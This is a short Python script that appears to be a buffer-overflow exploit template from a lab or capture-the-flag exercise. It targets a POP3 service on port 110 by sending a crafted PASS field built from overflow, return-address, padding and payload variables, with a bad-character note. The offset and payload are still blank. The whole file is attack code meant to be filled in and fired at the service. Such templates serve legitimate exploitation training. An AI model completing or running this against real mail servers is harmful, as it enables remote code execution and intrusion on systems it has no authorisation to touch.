#!/usr/bin/env python

import socket

ip = "10.10.151.194" # Change this to the IP of the target
port = 110

user = "USER test\r\n"
password = "PASS "
offset = 0
overflow = "A" * offset
retn = ""
# Bad Chars "\x00"
padding = ""
payload = ""
buffer = password + overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending buffer...")
    s.recv(1024)		
    s.send(bytes(user, "latin-1"))
    s.recv(1024)		
    s.send(bytes(buffer + "\r\n", "latin-1"))
    s.recv(1024)
    print("Done!")
except:
    print("Could not connect.")
